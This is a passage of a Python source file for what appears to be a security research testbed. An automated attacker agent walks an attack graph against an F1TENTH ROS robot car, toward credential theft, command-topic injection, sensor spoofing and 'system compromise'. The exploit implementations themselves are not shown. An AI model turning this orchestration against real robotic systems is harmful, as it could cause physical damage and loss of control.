        changed = True

    if changed:
        save_state(state)

    return load_state()


def propagate_derived(graph, state):
    state = normalize_state(state)
    changed = True

    while changed:
        changed = False
        for pred in sorted(graph["actions"]):
            if pred not in DERIVABLE_PREDS:
                continue
            if achieved(state, pred):
                continue

            dep_options = graph.get("dep_options", {}).get(pred, [])
            if not dep_options:
                dep_options = [graph["deps"].get(pred, [])]

            if any(all(achieved(state, d) for d in option) for option in dep_options):
                state["predicates"][pred] = True
                state["meta"][f"why::{pred}"] = "derived_from_graph"
                smg_key = PRED_TO_SMG.get(pred)
                if smg_key:
                    state["smg"][smg_key] = True
                changed = True

        if changed:
            save_state(state)
            state = load_state()

    return state


# -----------------------------
# enabled executable actions
# -----------------------------
def attacker_enabled_actions(graph, state):
    enabled = []

    for a in sorted(graph["actions"]):
        if a not in EXECUTABLE_ATTACK_ACTIONS:
            continue
        if achieved(state, a):
            continue

        dep_options = graph.get("dep_options", {}).get(a, [])
        if not dep_options:
            dep_options = [graph["deps"].get(a, [])]

        if any(all(achieved(state, d) for d in option) for option in dep_options):
            enabled.append(a)

    return enabled


def _true_preds_for_diff(state):
    state = normalize_state(state)
    out = set()
    for k, v in state["facts"].items():
        if v:
            out.add(k)
    for k, v in state["predicates"].items():
        if v:
            out.add(k)
    return out


def explain_progress(graph, before_state, after_state, executed_pred):
    before_true = _true_preds_for_diff(before_state)
    after_true = _true_preds_for_diff(after_state)
    new_preds = sorted(p for p in (after_true - before_true))

    if not new_preds:
        return

    print("\n[EXPLAIN] New progress this step:")
    print(f"  - {executed_pred} (executed action)")
    chain_order = [executed_pred]

    dep_options = graph.get("dep_options", {})
    known = {executed_pred}
    remaining = [p for p in new_preds if p != executed_pred]

    # Print a compact causal chain from the executed action to newly derived predicates.
    while remaining:
        progressed = False
        for p in list(remaining):
            options = dep_options.get(p)
            if not options:
                options = [graph.get("deps", {}).get(p, [])]

            picked = None
            for opt in options:
                if all(d in after_true for d in opt) and any(d in known for d in opt):
                    picked = opt
                    break

            if picked is None:
                continue

            deps_text = ", ".join(picked) if picked else "(no prerequisites)"
            print(f"  - {p} <= {deps_text}")
            known.add(p)
            chain_order.append(p)
            remaining.remove(p)
            progressed = True

        if not progressed:
            # Fallback for predicates derived but not easily chained from executed_pred.
            for p in remaining:
                print(f"  - {p}")
                chain_order.append(p)
            break

    if "systemCompromised(f1tenth)" in new_preds:
        print("  - systemCompromised(f1tenth): goal reached from the chain above")
        # Plain-English one-liner for meetings/demos
        compressed = []
        for p in chain_order:
            if not compressed or compressed[-1] != p:
                compressed.append(p)
        print("\n[EXPLAIN_SUMMARY] " + " -> ".join(compressed))
        print("[EXPLAIN_SUMMARY] Therefore: this step's action led through the intermediate states to system compromise.")


# -----------------------------
# attacker agent
# -----------------------------
class AttackerAgent:
    def take_turn(self, graph, state, show_achieved):
        state = initialize_graph_facts(graph, state)
        state = propagate_derived(graph, state)

        enabled = attacker_enabled_actions(graph, state)
        if not enabled:
            print("[ATTACKER] No enabled executable attack actions.")
            state = load_state()
            show_achieved(state)
            return None, None, state, False

        policy = os.environ.get("ATTACKER_POLICY", "random").strip().lower()
        if policy == "random":
            import random
            ordered = enabled[:]
            random.shuffle(ordered)
        else:
            ordered = enabled

        print("[ATTACKER] Enabled executable actions:", enabled)

        for pred in ordered:
            prism_label = PRED_TO_ATTACK_LABEL.get(pred, "UNMAPPED")
            print("[ATTACKER] Chosen attack action:", pred)
            print("[ATTACKER] Equivalent PRISM label:", prism_label)

            fn = ACTION_IMPL.get(pred)
            if fn is None:
                print(f"[ATTACKER] No runtime implementation for executable action: {pred}")
                continue

            pre_action_state = load_state()
            ok = fn()

            if ok:
                state = load_state()
                mark_pred(state, pred, why="action_executed")

                state = load_state()
                smg_key = PRED_TO_SMG.get(pred)
                if smg_key:
                    set_smg(state, smg_key, True)

                state = load_state()
                state = propagate_derived(graph, state)

                state = load_state()
                set_turn(state, 2)

                state = load_state()
                print("[ATTACKER] result:", ok)
                explain_progress(graph, pre_action_state, state, pred)
                show_achieved(state)
                return pred, prism_label, state, True

            print(f"[ATTACKER] action failed: {pred}, trying next enabled action...")

        state = load_state()
        print("[ATTACKER] No enabled action succeeded.")
        show_achieved(state)
        return None, None, state, False


# -----------------------------
# standalone debug entrypoint
# -----------------------------
if __name__ == "__main__":
    import sys

    DOT_DEFAULT = "AttackGraph.dot"
    MAX_STEPS = int(os.environ.get("MAX_STEPS", "20"))

    def show_achieved(state):
        state = normalize_state(state)
        if ATTACKER_OUTPUT in {"full", "verbose", "1"}:
            print("\n[STATE] facts:")
            for k in sorted([k for k, v in state["facts"].items() if v]):
                print("  [FACT]", k)

            print("\n[STATE] achieved predicates:")
            for k in sorted([k for k, v in state["predicates"].items() if v]):
                print("  [PRED]", k)

            print("\n[STATE] smg:")
            for k in sorted(state["smg"].keys()):
                print(f"  [SMG] {k} = {state['smg'][k]}")
            return

        # Summary mode: keep output readable for demos/meetings
        true_preds = sorted([k for k, v in state["predicates"].items() if v])
        key_preds = [
            "initialAccess(engineering_ws)",
            "lateralAccess(robot_host)",
            "attackerOnRosNetwork(robot_host)",
            "credentialAccess(robot_host)",
            "attackerCanJoinRosGraph(robot_host)",
            "attackerCanNetAdmin(robot_host)",
            "graphDiscovery(bridge)",
            "targetNodeSelected(bridge)",
            "serviceCall('/bridge/set_parameters',bridge)",
            "serviceCall('/map_server/change_state',map_server)",
            "maliciousTopicContent('/scan')",
            "qosDegradation('/scan')",
            "topicDelay('/scan')",
            "topicDrop('/scan')",
            "topicRead('/scan')",
            "topicWrite('/drive')",
            "topicWrite('/scan')",
            "topicFlood('/drive')",
            "parameterTamper(bridge)",
            "configurationIntegrityLoss(bridge)",
            "lifecycleAbuse(map_server)",
            "lifecycleDisruption(map_server)",
            "sensorIntegrityLoss('/scan')",
            "sensorAvailabilityLoss('/scan')",
            "commandIntegrityLoss('/drive')",
            "confidentialityCompromise(f1tenth)",
            "operationalCompromise(f1tenth)",
            "availabilityCompromise(f1tenth)",
            "systemCompromised(f1tenth)",
        ]
        achieved_keys = [p for p in key_preds if p in true_preds]
        print("\n[STATE_SUMMARY] key predicates:")
        for p in achieved_keys:
            print("  -", p)

    attack_dot_path = sys.argv[1] if len(sys.argv) >= 2 else DOT_DEFAULT

    if not os.path.exists(attack_dot_path):
        raise FileNotFoundError(f"Attack graph file not found: {attack_dot_path}")

    with open(attack_dot_path, "r", errors="ignore") as f:
        attack_dot = f.read()

    graph = build_graph(attack_dot)

    state = load_state()
    save_state(state)

    attacker = AttackerAgent()

    for step in range(1, MAX_STEPS + 1):
        print(f"\n========== ATTACK STEP {step} ==========")
        pred, prism_label, state, ok = attacker.take_turn(graph, load_state(), show_achieved)

        print("\n[RESULT]")
        print("pred =", pred)
        print("prism_label =", prism_label)
        print("ok =", ok)

        if not ok:
            print("[INFO] No enabled executable attack actions remain, or all enabled actions failed.")
            break

        if achieved(load_state(), "systemCompromised(f1tenth)"):
            print("\n[TERMINAL] Attacker reached systemCompromised(f1tenth)")
            break

